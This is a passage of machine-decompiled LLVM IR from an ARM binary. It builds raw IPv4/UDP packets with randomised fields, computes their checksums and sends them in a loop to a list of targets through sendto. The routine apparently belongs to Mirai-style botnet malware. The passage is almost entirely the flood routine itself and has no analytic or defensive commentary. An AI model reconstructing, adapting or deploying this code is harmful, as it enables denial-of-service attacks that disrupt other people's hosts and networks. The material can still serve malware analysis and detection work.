  store i32 %v2_aac4, i32* %r0.global-to-local, align 4
  %v2_aacc = load i32, i32* @r4, align 4
  %v5_aacc = mul i32 %v2_aacc, 4
  %v6_aacc = add i32 %v5_aacc, %v2_a86c
  %v7_aacc = inttoptr i32 %v6_aacc to i32*
  store i32 %v2_aac4, i32* %v7_aacc, align 4
  %v3_aad0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_aad0, i32* %r2.global-to-local, align 4
  %v5_aad8 = mul i32 %v3_aad0, 24
  %v1_aadc = load i32, i32* @sb, align 4
  %v2_aadc = add i32 %v1_aadc, %v5_aad8
  store i32 %v2_aadc, i32* @lr, align 4
  store i32 %v2_a86c, i32* %r3.global-to-local, align 4
  %v4_aae4 = mul i32 %v3_aad0, 4
  %v5_aae4 = add i32 %v4_aae4, %v2_a86c
  %v6_aae4 = inttoptr i32 %v5_aae4 to i32*
  %v7_aae4 = load i32, i32* %v6_aae4, align 4
  store i32 %v7_aae4, i32* %r4.global-to-local, align 4
  %v1_aae8 = inttoptr i32 %v7_aae4 to i8*
  %v2_aae8 = load i8, i8* %v1_aae8, align 1
  %tmp = urem i8 %v2_aae8, 16
  %v1_aaec = zext i8 %tmp to i32
  %v1_aaf0 = or i32 %v1_aaec, 64
  store i32 %v1_aaf0, i32* %r3.global-to-local, align 4
  %v1_aaf4 = trunc i32 %v1_aaf0 to i8
  store i8 %v1_aaf4, i8* %v1_aae8, align 1
  %v0_aaf8 = load i32, i32* %r4.global-to-local, align 4
  %v1_aaf8 = inttoptr i32 %v0_aaf8 to i8*
  %v2_aaf8 = load i8, i8* %v1_aaf8, align 1
  %v1_aafc = and i8 %v2_aaf8, -16
  %v1_ab00 = or i8 %v1_aafc, 5
  store i32 %v1_a8ec, i32* %r5.global-to-local, align 4
  store i8 %v1_ab00, i8* %v1_aaf8, align 1
  store i32 %v4_ab0c, i32* %r1.global-to-local, align 4
  %v2_ab10 = load i32, i32* %r4.global-to-local, align 4
  %v3_ab10 = add i32 %v2_ab10, 1
  %v4_ab10 = inttoptr i32 %v3_ab10 to i8*
  store i8 %v5_a8a4, i8* %v4_ab10, align 1
  store i32 %v1_a8c8, i32* %r2.global-to-local, align 4
  %v2_ab18 = load i32, i32* %r4.global-to-local, align 4
  %v3_ab18 = add i32 %v2_ab18, 8
  %v4_ab18 = inttoptr i32 %v3_ab18 to i8*
  store i8 %v1_ab18, i8* %v4_ab18, align 1
  %v2_ab20 = load i32, i32* %r4.global-to-local, align 4
  %v3_ab20 = add i32 %v2_ab20, 4
  %v4_ab20 = inttoptr i32 %v3_ab20 to i16*
  store i16 %v5_aaa0, i16* %v4_ab20, align 2
  %v2_ab28 = load i32, i32* %r4.global-to-local, align 4
  %v3_ab28 = add i32 %v2_ab28, 9
  %v4_ab28 = inttoptr i32 %v3_ab28 to i8*
  store i8 47, i8* %v4_ab28, align 1
  store i32 %v5_a98c, i32* %r3.global-to-local, align 4
  %v0_ab30 = load i32, i32* %r5.global-to-local, align 4
  %v2_ab30 = icmp eq i32 %v0_ab30, 0
  store i1 %v2_ab30, i1* %cpsr_z.global-to-local, align 1
  %v1_ab34 = load i32, i32* %r4.global-to-local, align 4
  %v2_ab34 = add i32 %v1_ab34, 12
  %v3_ab34 = inttoptr i32 %v2_ab34 to i32*
  store i32 %v5_a98c, i32* %v3_ab34, align 4
  br i1 %v2_ab30, label %.thread25, label %bb

bb:                                               ; preds = %dec_label_pc_aab8
  store i32 64, i32* %r2.global-to-local, align 4
  %v3_ab3c = load i32, i32* %r4.global-to-local, align 4
  %v4_ab3c = add i32 %v3_ab3c, 6
  %v5_ab3c = inttoptr i32 %v4_ab3c to i16*
  store i16 64, i16* %v5_ab3c, align 2
  br label %.thread25

.thread25:                                        ; preds = %dec_label_pc_aab8, %bb
  %v0_ab40 = load i32, i32* @lr, align 4
  %v1_ab40 = add i32 %v0_ab40, 16
  %v2_ab40 = inttoptr i32 %v1_ab40 to i32*
  %v3_ab40 = load i32, i32* %v2_ab40, align 4
  store i32 22528, i32* %ip.global-to-local, align 4
  %v1_ab48 = load i32, i32* %r4.global-to-local, align 4
  %v2_ab48 = add i32 %v1_ab48, 16
  %v3_ab48 = inttoptr i32 %v2_ab48 to i32*
  store i32 %v3_ab40, i32* %v3_ab48, align 4
  %v0_ab4c = load i32, i32* %r4.global-to-local, align 4
  %v1_ab4c = add i32 %v0_ab4c, 24
  store i32 %v1_ab4c, i32* %r1.global-to-local, align 4
  %v1_ab50 = add i32 %v0_ab4c, 20
  store i32 %v1_ab50, i32* %r0.global-to-local, align 4
  %v0_ab54 = load i32, i32* %ip.global-to-local, align 4
  %v1_ab54 = add i32 %v0_ab54, 101
  store i32 %v1_ab54, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v0_ab60 = load i32, i32* @r8, align 4
  %v1_ab60 = trunc i32 %v0_ab60 to i16
  %v3_ab60 = add i32 %v0_ab4c, 2
  %v4_ab60 = inttoptr i32 %v3_ab60 to i16*
  store i16 %v1_ab60, i16* %v4_ab60, align 2
  %v0_ab64 = load i32, i32* %ip.global-to-local, align 4
  %v1_ab64 = trunc i32 %v0_ab64 to i16
  %v2_ab64 = load i32, i32* %r0.global-to-local, align 4
  %v3_ab64 = add i32 %v2_ab64, 2
  %v4_ab64 = inttoptr i32 %v3_ab64 to i16*
  store i16 %v1_ab64, i16* %v4_ab64, align 2
  %v0_ab68 = load i32, i32* %r3.global-to-local, align 4
  %v1_ab68 = trunc i32 %v0_ab68 to i8
  %v2_ab68 = load i32, i32* %r1.global-to-local, align 4
  %v3_ab68 = add i32 %v2_ab68, 13
  %v4_ab68 = inttoptr i32 %v3_ab68 to i8*
  store i8 %v1_ab68, i8* %v4_ab68, align 1
  %v0_ab6c = load i32, i32* %r2.global-to-local, align 4
  %v1_ab6c = trunc i32 %v0_ab6c to i8
  %v2_ab6c = load i32, i32* %r1.global-to-local, align 4
  %v3_ab6c = add i32 %v2_ab6c, 12
  %v4_ab6c = inttoptr i32 %v3_ab6c to i8*
  store i8 %v1_ab6c, i8* %v4_ab6c, align 1
  %v0_ab70 = load i32, i32* %r4.global-to-local, align 4
  %v1_ab70 = add i32 %v0_ab70, 38
  %v2_ab70 = inttoptr i32 %v1_ab70 to i8*
  %v3_ab70 = load i8, i8* %v2_ab70, align 1
  %tmp89 = urem i8 %v3_ab70, 16
  %v1_ab74 = zext i8 %tmp89 to i32
  %v1_ab78 = or i32 %v1_ab74, 64
  store i32 %v1_ab78, i32* %r3.global-to-local, align 4
  %v1_ab7c = trunc i32 %v1_ab78 to i8
  store i8 %v1_ab7c, i8* %v2_ab70, align 1
  %v0_ab80 = load i32, i32* %r4.global-to-local, align 4
  %v1_ab80 = add i32 %v0_ab80, 38
  %v2_ab80 = inttoptr i32 %v1_ab80 to i8*
  %v3_ab80 = load i8, i8* %v2_ab80, align 1
  %v1_ab84 = and i8 %v3_ab80, -16
  %v1_ab88 = or i8 %v1_ab84, 5
  store i8 %v1_ab88, i8* %v2_ab80, align 1
  %v0_ab94 = load i32, i32* %r4.global-to-local, align 4
  %v1_ab94 = add i32 %v0_ab94, 38
  store i32 %v1_ab94, i32* @r5, align 4
  %v3_ab98 = add i32 %v0_ab94, 39
  %v4_ab98 = inttoptr i32 %v3_ab98 to i8*
  store i8 %v5_a8a4, i8* %v4_ab98, align 1
  store i32 %v5_aa94, i32* %r2.global-to-local, align 4
  %v2_aba0 = load i32, i32* @r5, align 4
  %v3_aba0 = add i32 %v2_aba0, 2
  %v4_aba0 = inttoptr i32 %v3_aba0 to i16*
  store i16 %v5_aaa8, i16* %v4_aba0, align 2
  store i32 %v4_aba4, i32* %r3.global-to-local, align 4
  store i32 %v1_a8c8, i32* %r1.global-to-local, align 4
  %v0_abac = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_abac, label %.thread26, label %bb83

.thread26:                                        ; preds = %.thread25
  %v2_abb028 = load i32, i32* @r5, align 4
  %v3_abb029 = add i32 %v2_abb028, 4
  %v4_abb030 = inttoptr i32 %v3_abb029 to i16*
  store i16 %v1_abb027, i16* %v4_abb030, align 2
  store i32 17, i32* %r3.global-to-local, align 4
  br label %bb84

bb83:                                             ; preds = %.thread25
  store i32 64, i32* %r2.global-to-local, align 4
  %v2_abb0 = load i32, i32* @r5, align 4
  %v3_abb0 = add i32 %v2_abb0, 4
  %v4_abb0 = inttoptr i32 %v3_abb0 to i16*
  store i16 %v1_abb027, i16* %v4_abb0, align 2
  store i32 17, i32* %r3.global-to-local, align 4
  %v1_abb8 = load i32, i32* %r2.global-to-local, align 4
  %v2_abb8 = trunc i32 %v1_abb8 to i16
  %v3_abb8 = load i32, i32* @r5, align 4
  %v4_abb8 = add i32 %v3_abb8, 6
  %v5_abb8 = inttoptr i32 %v4_abb8 to i16*
  store i16 %v2_abb8, i16* %v5_abb8, align 2
  br label %bb84

bb84:                                             ; preds = %.thread26, %bb83
  %v0_abbc = load i32, i32* %r1.global-to-local, align 4
  %v1_abbc = trunc i32 %v0_abbc to i8
  %v2_abbc = load i32, i32* @r5, align 4
  %v3_abbc = add i32 %v2_abbc, 8
  %v4_abbc = inttoptr i32 %v3_abbc to i8*
  store i8 %v1_abbc, i8* %v4_abbc, align 1
  %v0_abc0 = load i32, i32* %r3.global-to-local, align 4
  %v1_abc0 = trunc i32 %v0_abc0 to i8
  %v2_abc0 = load i32, i32* @r5, align 4
  %v3_abc0 = add i32 %v2_abc0, 9
  %v4_abc0 = inttoptr i32 %v3_abc0 to i8*
  store i8 %v1_abc0, i8* %v4_abc0, align 1
  %v0_abc4 = call i32 @rand_next()
  store i32 %v0_abc4, i32* %r0.global-to-local, align 4
  store i32 %v1_a9e4, i32* %r1.global-to-local, align 4
  store i1 %v2_abd0, i1* %cpsr_z.global-to-local, align 1
  %v1_abd4 = sub i32 1023, %v0_abc4
  store i32 %v1_abd4, i32* %r3.global-to-local, align 4
  br i1 %v2_abd0, label %.thread, label %.thread10

.thread:                                          ; preds = %bb84
  %v2_abdc = load i32, i32* @r5, align 4
  %v3_abdc = add i32 %v2_abdc, 16
  %v4_abdc = inttoptr i32 %v3_abdc to i32*
  store i32 %v1_abd4, i32* %v4_abdc, align 4
  br label %bb85

.thread10:                                        ; preds = %bb84
  %v1_abd8 = load i32, i32* %r4.global-to-local, align 4
  %v2_abd8 = add i32 %v1_abd8, 16
  %v3_abd8 = inttoptr i32 %v2_abd8 to i32*
  %v4_abd8 = load i32, i32* %v3_abd8, align 4
  store i32 %v4_abd8, i32* %r3.global-to-local, align 4
  %v2_abe0 = load i32, i32* @r5, align 4
  %v3_abe0 = add i32 %v2_abe0, 16
  %v4_abe0 = inttoptr i32 %v3_abe0 to i32*
  store i32 %v4_abd8, i32* %v4_abe0, align 4
  br label %bb85

bb85:                                             ; preds = %.thread, %.thread10
  %v1_abe4 = load i32, i32* @r5, align 4
  %v2_abe4 = add i32 %v1_abe4, 12
  %v3_abe4 = inttoptr i32 %v2_abe4 to i32*
  store i32 %v0_abc4, i32* %v3_abe4, align 4
  %v3_abe8 = load i32, i32* %stack_var_-44, align 4
  %v0_abec = load i32, i32* %r4.global-to-local, align 4
  %v1_abec = add i32 %v0_abec, 58
  store i32 %v1_abec, i32* @r6, align 4
  store i32 %v4_abf0, i32* %r2.global-to-local, align 4
  %v1_abf4 = add i32 %v3_abe8, 1
  store i32 %v1_abf4, i32* @r4, align 4
  store i32 %v4_abf8, i32* %r3.global-to-local, align 4
  %v1_abfc = load i32, i32* @sl, align 4
  %v9_abfc = icmp eq i32 %v1_abf4, %v1_abfc
  store i1 %v9_abfc, i1* %cpsr_z.global-to-local, align 1
  %v0_ac00 = load i32, i32* @r7, align 4
  %v1_ac00 = trunc i32 %v0_ac00 to i16
  %v3_ac00 = add i32 %v0_abec, 62
  %v4_ac00 = inttoptr i32 %v3_ac00 to i16*
  store i16 %v1_ac00, i16* %v4_ac00, align 2
  %v0_ac04 = load i32, i32* %r2.global-to-local, align 4
  %v1_ac04 = trunc i32 %v0_ac04 to i16
  %v2_ac04 = load i32, i32* @r6, align 4
  %v3_ac04 = inttoptr i32 %v2_ac04 to i16*
  store i16 %v1_ac04, i16* %v3_ac04, align 2
  %v0_ac08 = load i32, i32* %r3.global-to-local, align 4
  %v1_ac08 = trunc i32 %v0_ac08 to i16
  %v2_ac08 = load i32, i32* @r6, align 4
  %v3_ac08 = add i32 %v2_ac08, 2
  %v4_ac08 = inttoptr i32 %v3_ac08 to i16*
  store i16 %v1_ac08, i16* %v4_ac08, align 2
  %v0_ac0c = load i32, i32* @r4, align 4
  store i32 %v0_ac0c, i32* %stack_var_-44, align 4
  %v5_ac10 = icmp slt i32 %v1_abf4, %v1_abfc
  br i1 %v5_ac10, label %dec_label_pc_aab8, label %dec_label_pc_ac14

dec_label_pc_ac14:                                ; preds = %bb85
  %v1_ac1c = add i32 %v5_a938, 8
  store i32 %v1_ac1c, i32* %r4.global-to-local, align 4
  %v1_ac20 = add i32 %v5_a938, 66
  store i32 %v1_ac20, i32* %r5.global-to-local, align 4
  %v0_ac30.pre.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_ac2c.preheader

dec_label_pc_ac2c.preheader:                      ; preds = %dec_label_pc_ac14, %dec_label_pc_aec4
  %v0_ac30.pre = phi i32 [ %v0_ac30.pre.pre, %dec_label_pc_ac14 ], [ 0, %dec_label_pc_aec4 ]
  %stack_var_-132.0.ph = phi i32 [ %v1_ac20, %dec_label_pc_ac14 ], [ %v1_aed0, %dec_label_pc_aec4 ]
  %stack_var_-136.0.ph = phi i32 [ %v1_ac1c, %dec_label_pc_ac14 ], [ %v1_aecc, %dec_label_pc_aec4 ]
  %v2_ae80 = icmp eq i32 %v1_a9e4, 0
  %v2_acc8 = ptrtoint i32* %stack_var_-48 to i32
  %v2_ace0 = ptrtoint i32* %stack_var_-52 to i32
  %v2_acf0 = ptrtoint i32* %stack_var_-56 to i32
  %v2_acfc = ptrtoint i32* %stack_var_-54 to i32
  %v2_ad10 = icmp eq i32 %v1_a958, 0
  %v2_ac70 = icmp eq i32 %v5_a98c, -1
  %v7_ac70 = icmp eq i32 %v5_a98c, -1
  br label %dec_label_pc_ac2c

dec_label_pc_ac2c:                                ; preds = %dec_label_pc_ac2c, %dec_label_pc_ad18, %dec_label_pc_ac2c.preheader
  %v0_ac30 = phi i32 [ %v0_ac30.pre, %dec_label_pc_ac2c.preheader ], [ 0, %dec_label_pc_ac2c ], [ %v1_adb4, %dec_label_pc_ad18 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_ac30 = icmp eq i32 %v0_ac30, 0
  store i1 %v2_ac30, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_ac30, label %dec_label_pc_ac2c, label %dec_label_pc_ac3c

dec_label_pc_ac3c:                                ; preds = %dec_label_pc_ac2c
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ac40

dec_label_pc_ac40:                                ; preds = %dec_label_pc_ad18, %dec_label_pc_ac3c
  %v1_ac54 = phi i32 [ %v1_adb0, %dec_label_pc_ad18 ], [ 0, %dec_label_pc_ac3c ]
  %v5_ac44 = mul i32 %v1_ac54, 24
  %v1_ac48 = load i32, i32* @sb, align 4
  %v2_ac48 = add i32 %v1_ac48, %v5_ac44
  store i32 %v2_ac48, i32* %r3.global-to-local, align 4
  store i32 %v2_a86c, i32* %r4.global-to-local, align 4
  %v1_ac50 = add i32 %v2_ac48, 20
  %v2_ac50 = inttoptr i32 %v1_ac50 to i8*
  %v3_ac50 = load i8, i8* %v2_ac50, align 1
  %v4_ac50 = zext i8 %v3_ac50 to i32
  store i32 %v4_ac50, i32* %r2.global-to-local, align 4
  %v4_ac54 = mul i32 %v1_ac54, 4
  %v5_ac54 = add i32 %v4_ac54, %v2_a86c
  %v6_ac54 = inttoptr i32 %v5_ac54 to i32*
  %v7_ac54 = load i32, i32* %v6_ac54, align 4
  store i32 %v7_ac54, i32* @r5, align 4
  %v7_ac58 = icmp eq i8 %v3_ac50, 31
  store i1 %v7_ac58, i1* %cpsr_z.global-to-local, align 1
  %v1_ac5c = add i32 %v7_ac54, 24
  store i32 %v1_ac5c, i32* @r7, align 4
  %v1_ac60 = add i32 %v7_ac54, 38
  store i32 %v1_ac60, i32* @r6, align 4
  %v1_ac64 = add i32 %v7_ac54, 58
  store i32 %v1_ac64, i32* @r8, align 4
  %tmp90 = icmp ult i8 %v3_ac50, 32
  br i1 %tmp90, label %dec_label_pc_adc4, label %dec_label_pc_ac6c

dec_label_pc_ac6c:                                ; preds = %dec_label_pc_ac40
  store i32 %v5_a98c, i32* %r1.global-to-local, align 4
  store i1 %v7_ac70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ac70, label %dec_label_pc_ae24, label %dec_label_pc_ac78

dec_label_pc_ac78:                                ; preds = %dec_label_pc_adc4, %dec_label_pc_ac6c
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_ac80 = load i32, i32* @fp, align 4
  %v9_ac80 = icmp eq i32 %v0_ac80, 65535
  store i1 %v9_ac80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ac80, label %dec_label_pc_ae3c, label %dec_label_pc_ac88

dec_label_pc_ac88:                                ; preds = %dec_label_pc_ae24.dec_label_pc_ac88_crit_edge, %dec_label_pc_ac78
  %v1_ac8c = phi i32 [ %v1_ac8c.pre, %dec_label_pc_ae24.dec_label_pc_ac88_crit_edge ], [ 65535, %dec_label_pc_ac78 ]
  store i32 %v3_a9ec, i32* %r2.global-to-local, align 4
  %v9_ac8c = icmp eq i32 %v3_a9ec, %v1_ac8c
  store i1 %v9_ac8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ac8c, label %dec_label_pc_ae64, label %dec_label_pc_ac94

dec_label_pc_ac94:                                ; preds = %dec_label_pc_ae3c.dec_label_pc_ac94_crit_edge, %dec_label_pc_ac88
  %v1_ac98 = phi i32 [ %v1_ac98.pre, %dec_label_pc_ae3c.dec_label_pc_ac94_crit_edge ], [ %v1_ac8c, %dec_label_pc_ac88 ]
  store i32 %v3_a9f0, i32* %r3.global-to-local, align 4
  %v9_ac98 = icmp eq i32 %v3_a9f0, %v1_ac98
  store i1 %v9_ac98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ac98, label %dec_label_pc_ae78, label %dec_label_pc_aca0

dec_label_pc_aca0:                                ; preds = %dec_label_pc_ae64, %dec_label_pc_ac94
  store i32 %v1_a9e4, i32* @r4, align 4
  store i1 %v2_ae80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ae80, label %dec_label_pc_ae94, label %.thread11

.thread11:                                        ; preds = %dec_label_pc_aca0
  %v1_aca8 = load i32, i32* @r5, align 4
  %v2_aca8 = add i32 %v1_aca8, 16
  %v3_aca8 = inttoptr i32 %v2_aca8 to i32*
  %v4_aca8 = load i32, i32* %v3_aca8, align 4
  store i32 %v4_aca8, i32* %r3.global-to-local, align 4
  %v2_acac = load i32, i32* @r6, align 4
  %v3_acac = add i32 %v2_acac, 16
  %v4_acac = inttoptr i32 %v3_acac to i32*
  store i32 %v4_aca8, i32* %v4_acac, align 4
  br label %dec_label_pc_acb4

dec_label_pc_acb4:                                ; preds = %bb88, %.thread11, %dec_label_pc_ae94
  %v0_acb4 = call i32 @rand_next()
  store i32 %v0_acb4, i32* %r0.global-to-local, align 4
  store i32 %v0_acb4, i32* %stack_var_-48, align 4
  %v0_acbc = call i32 @rand_next()
  store i32 %v0_acbc, i32* %r0.global-to-local, align 4
  store i32 %v0_acbc, i32* %stack_var_-52, align 4
  %v0_acc4 = call i32 @rand_next()
  store i32 %v2_acc8, i32* %r1.global-to-local, align 4
  store i32 %v0_acc4, i32* %stack_var_-56, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_acd4 = load i32, i32* @r7, align 4
  store i32 %v0_acd4, i32* %r0.global-to-local, align 4
  %v3_acd8 = call i32 @util_memcpy(i32 %v0_acd4, i32 %v2_acc8, i32 4)
  %v0_acdc = load i32, i32* @r7, align 4
  %v1_acdc = add i32 %v0_acdc, 6
  store i32 %v1_acdc, i32* %r0.global-to-local, align 4
  store i32 %v2_ace0, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v3_ace8 = call i32 @util_memcpy(i32 %v1_acdc, i32 %v2_ace0, i32 4)
  %v0_acec = load i32, i32* @r7, align 4
  %v1_acec = add i32 %v0_acec, 4
  store i32 %v1_acec, i32* %r0.global-to-local, align 4
  store i32 %v2_acf0, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_acf8 = call i32 @util_memcpy(i32 %v1_acec, i32 %v2_acf0, i32 2)
  store i32 %v2_acfc, i32* %r1.global-to-local, align 4
  %v0_ad00 = load i32, i32* @r7, align 4
  %v1_ad00 = add i32 %v0_ad00, 10
  store i32 %v1_ad00, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_ad08 = call i32 @util_memcpy(i32 %v1_ad00, i32 %v2_acfc, i32 2)
  store i32 %v3_ad08, i32* %r0.global-to-local, align 4
  store i32 %v1_a958, i32* %r1.global-to-local, align 4
  store i1 %v2_ad10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ad10, label %dec_label_pc_ad18, label %dec_label_pc_aea0

dec_label_pc_ad18:                                ; preds = %dec_label_pc_acb4, %dec_label_pc_aea0
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_ad1c = load i32, i32* @r5, align 4
  %v3_ad1c = add i32 %v2_ad1c, 10
  %v4_ad1c = inttoptr i32 %v3_ad1c to i16*
  store i16 0, i16* %v4_ad1c, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_ad24 = load i32, i32* @r5, align 4
  store i32 %v0_ad24, i32* @r0, align 4
  %v2_ad28 = call i32 @checksum_generic(i32 %v0_ad24, i32 20)
  %v3_ad28 = trunc i32 %v2_ad28 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_ad30 = load i32, i32* @r5, align 4
  %v4_ad30 = add i32 %v3_ad30, 10
  %v5_ad30 = inttoptr i32 %v4_ad30 to i16*
  store i16 %v3_ad28, i16* %v5_ad30, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_ad38 = load i32, i32* %r3.global-to-local, align 4
  %v1_ad38 = trunc i32 %v0_ad38 to i16
  %v2_ad38 = load i32, i32* @r6, align 4
  %v3_ad38 = add i32 %v2_ad38, 10
  %v4_ad38 = inttoptr i32 %v3_ad38 to i16*
  store i16 %v1_ad38, i16* %v4_ad38, align 2
  %v0_ad3c = load i32, i32* @r6, align 4
  store i32 %v0_ad3c, i32* @r0, align 4
  %v2_ad40 = call i32 @checksum_generic(i32 %v0_ad3c, i32 20)
  %v3_ad40 = trunc i32 %v2_ad40 to i16
  store i32 %v2_ad40, i32* %r0.global-to-local, align 4
  %v3_ad44 = load i32, i32* @r6, align 4
  %v4_ad44 = add i32 %v3_ad44, 10
  %v5_ad44 = inttoptr i32 %v4_ad44 to i16*
  store i16 %v3_ad40, i16* %v5_ad44, align 2
  store i32 0, i32* @r4, align 4
  %v0_ad4c = load i32, i32* @r8, align 4
  store i32 %v0_ad4c, i32* @r1, align 4
  %v1_ad50 = add i32 %v0_ad4c, 4
  %v2_ad50 = inttoptr i32 %v1_ad50 to i16*
  %v3_ad50 = load i16, i16* %v2_ad50, align 2
  %v4_ad50 = zext i16 %v3_ad50 to i32
  store i32 %v4_ad50, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-136.0.ph, i32* %r3.global-to-local, align 4
  %v3_ad58 = add i32 %v0_ad4c, 6
  %v4_ad58 = inttoptr i32 %v3_ad58 to i16*
  store i16 0, i16* %v4_ad58, align 2
  %v0_ad5c = load i32, i32* @r6, align 4
  store i32 %v0_ad5c, i32* %r0.global-to-local, align 4
  %v4_ad60 = call i32 @checksum_tcpudp(i32 %v0_ad5c, i32 %v0_ad4c, i32 %v4_ad50, i32 %stack_var_-136.0.ph)
  %v5_ad60 = trunc i32 %v4_ad60 to i16
  store i32 %v4_ad60, i32* %r0.global-to-local, align 4
  %v3_ad64 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_ad64, i32* %r2.global-to-local, align 4
  %v3_ad68 = mul i32 %v3_ad64, 32
  store i32 %v3_ad68, i32* %r3.global-to-local, align 4
  %v0_ad6c = load i32, i32* @r5, align 4
  %v1_ad6c = add i32 %v0_ad6c, 16
  %v2_ad6c = inttoptr i32 %v1_ad6c to i32*
  %v3_ad6c = load i32, i32* %v2_ad6c, align 4
  %v5_ad70 = mul i32 %v3_ad64, 24
  store i32 %v5_ad70, i32* %r3.global-to-local, align 4
  %v1_ad74 = load i32, i32* @sb, align 4
  %v2_ad74 = add i32 %v1_ad74, %v5_ad70
  store i32 %v2_ad74, i32* @lr, align 4
  %v2_ad78 = add i32 %v2_ad74, 4
  %v3_ad78 = inttoptr i32 %v2_ad78 to i32*
  store i32 %v3_ad6c, i32* %v3_ad78, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_ad80 = load i32, i32* @r8, align 4
  %v4_ad80 = add i32 %v3_ad80, 6
  %v5_ad80 = inttoptr i32 %v4_ad80 to i16*
  store i16 %v5_ad60, i16* %v5_ad80, align 2
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_ad88 = load i32, i32* %r1.global-to-local, align 4
  %v1_ad88 = trunc i32 %v0_ad88 to i16
  %v2_ad88 = load i32, i32* %r3.global-to-local, align 4
  %v3_ad88 = load i32, i32* @sb, align 4
  %v4_ad88 = add i32 %v3_ad88, %v2_ad88
  %v5_ad88 = inttoptr i32 %v4_ad88 to i16*
  store i16 %v1_ad88, i16* %v5_ad88, align 2
  %v0_ad8c = load i32, i32* @r4, align 4
  %v1_ad8c = trunc i32 %v0_ad8c to i16
  %v2_ad8c = load i32, i32* @lr, align 4
  %v3_ad8c = add i32 %v2_ad8c, 2
  %v4_ad8c = inttoptr i32 %v3_ad8c to i16*
  store i16 %v1_ad8c, i16* %v4_ad8c, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_ad94 = load i32, i32* @r5, align 4
  store i32 %v0_ad94, i32* %r1.global-to-local, align 4
  store i32 %v3_a9a0, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-132.0.ph, i32* %r2.global-to-local, align 4
  %v0_ada0 = load i32, i32* @lr, align 4
  %v0_ada4 = load i32, i32* %ip.global-to-local, align 4
  %v6_ada8 = call i32 @__libc_sendto(i32 %v3_a9a0, i32 %v0_ad94, i32 %stack_var_-132.0.ph, i32 16384, i32 %v0_ada0, i32 %v0_ada4)
  %v3_adac = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_adac, i32* %r3.global-to-local, align 4
  %v1_adb0 = add i32 %v3_adac, 1
  store i32 %v1_adb0, i32* %r0.global-to-local, align 4
  %v1_adb4 = load i32, i32* @sl, align 4
  %v9_adb4 = icmp eq i32 %v1_adb0, %v1_adb4
  store i1 %v9_adb4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_adb0, i32* %stack_var_-44, align 4
  %v6_adbc = icmp slt i32 %v1_adb0, %v1_adb4
  br i1 %v6_adbc, label %dec_label_pc_ac40, label %dec_label_pc_ac2c

dec_label_pc_adc4:                                ; preds = %dec_label_pc_ac40
  %v1_adc4 = add i32 %v2_ac48, 16
  %v2_adc4 = inttoptr i32 %v1_adc4 to i32*
  %v3_adc4 = load i32, i32* %v2_adc4, align 4
  store i32 %v3_adc4, i32* %r4.global-to-local, align 4
  %v0_adc8 = call i32 @rand_next()
  store i32 %v0_adc8, i32* %r0.global-to-local, align 4
  %v3_adcc = load i32, i32* %stack_var_-44, align 4
  %v5_add4 = mul i32 %v3_adcc, 24
  %v0_add8 = load i32, i32* %r4.global-to-local, align 4
  %v1_add8 = and i32 %v0_add8, 16711680
  store i32 %v1_add8, i32* %ip.global-to-local, align 4
  %v3_addc = udiv i32 %v0_add8, 16777216
  %v4_ade0 = udiv i32 %v1_add8, 256
  %v5_ade0 = or i32 %v4_ade0, %v3_addc
  store i32 %v5_ade0, i32* %r2.global-to-local, align 4
  %v1_ade4 = load i32, i32* @sb, align 4
  %v2_ade4 = add i32 %v1_ade4, %v5_add4
  store i32 %v2_ade4, i32* %r1.global-to-local, align 4
  %v1_ade8 = and i32 %v0_add8, 65280
  store i32 %v1_ade8, i32* %r3.global-to-local, align 4
  %v1_adec = add i32 %v2_ade4, 20
  %v2_adec = inttoptr i32 %v1_adec to i8*
  %v3_adec = load i8, i8* %v2_adec, align 1
  %v4_adec = zext i8 %v3_adec to i32
  store i32 %v4_adec, i32* %ip.global-to-local, align 4
  %v5_adf4 = call i32 @llvm.bswap.i32(i32 %v0_add8)
  %v7_adf8 = lshr i32 %v0_adc8, %v4_adec
  %v8_adf8 = add i32 %v7_adf8, %v5_adf4
  store i32 %v8_adf8, i32* %r2.global-to-local, align 4
  %v1_adfc = and i32 %v8_adf8, 16711680
  store i32 %v1_adfc, i32* %r0.global-to-local, align 4
  store i32 %v5_a98c, i32* %r1.global-to-local, align 4
  %v5_ae14 = call i32 @llvm.bswap.i32(i32 %v8_adf8)
  store i32 %v5_ae14, i32* %r3.global-to-local, align 4
  store i1 %v7_ac70, i1* %cpsr_z.global-to-local, align 1
  %v1_ae1c = load i32, i32* @r5, align 4
  %v2_ae1c = add i32 %v1_ae1c, 16
  %v3_ae1c = inttoptr i32 %v2_ae1c to i32*
  store i32 %v5_ae14, i32* %v3_ae1c, align 4
  br i1 %v2_ac70, label %dec_label_pc_ae24, label %dec_label_pc_ac78

